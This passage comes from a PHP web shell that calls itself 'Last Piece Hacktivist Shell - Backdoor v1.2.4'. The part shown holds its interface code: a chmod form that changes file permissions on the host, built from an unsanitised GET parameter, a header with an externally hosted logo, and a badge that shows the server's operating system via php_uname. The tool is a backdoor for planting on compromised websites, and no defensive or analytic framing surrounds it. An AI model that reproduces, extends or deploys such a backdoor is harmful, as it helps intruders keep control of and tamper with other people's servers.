iv class="form-group">
                <label class="form-label">Permission</label>
                <input type="text" name="permission" class="form-input" placeholder="0755" maxlength="4" required>
            </div>
            <div style="display: flex; gap: 8px;">
                <button type="submit" class="btn btn-primary">Change</button>
                <a href="?lph=<?php echo urlencode(dirname($_GET['chmod'])); ?>&lastpiece=hacktivist" class="btn btn-secondary">Cancel</a>
            </div>
        </form>
    </div>
</div>

<?php else: ?>

<header class="app-header">
    <div class="header-left">
        <img src="https://l.top4top.io/p_3688fo4y41.png" class="header-logo" alt="">
        <div>
            <div class="header-title">Last Piece Hacktivist</div>
            <div class="header-sub">Shell - Backdoor v1.2.4</div>
        </div>
    </div>
    <div class="header-right">
        <span class="sys-badge"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
      